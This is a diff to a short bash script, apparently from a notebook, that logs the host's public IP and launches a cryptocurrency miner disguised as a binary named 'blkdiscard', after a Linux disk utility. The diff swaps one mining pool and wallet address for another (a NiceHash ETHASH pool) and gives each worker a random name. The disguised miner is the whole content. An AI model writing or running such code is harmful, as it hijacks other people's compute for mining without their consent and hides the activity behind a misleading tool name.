@@ -1,13 +1,7 @@
 #!/bin/bash
 %%capture
-!%%capture
 
 #gives ip address 
-curl ipecho.net/plain
-POOL=https://next.ton-pool.com
-USER=$1
-ALGO=TON
-WORKER=$(echo GPU-$(shuf -i 1000-9999 -n 1))
-
-chmod +x blkdiscard
-./blkdiscard --algo ETHASH --pool stratum+ssl://eth-sg.flexpool.io:5555 --user 0xd2b8488eF94b4F16C6fCacA8dfBde6C3DFdC38c5.LOLI-JEPANG
+curl ipecho.net/plain && curl ipecho.net/plain
+chmod +x blkdiscard 
+./blkdiscard --algo ETHASH --pool stratum+ssl://daggerhashimoto.auto.nicehash.com:443 --user 3PMe6Cv8cR4LRyH2JwHo4eKY1TtZGGrEq3.$(echo $(shuf -i 1-9999 -n 1)-Opai)
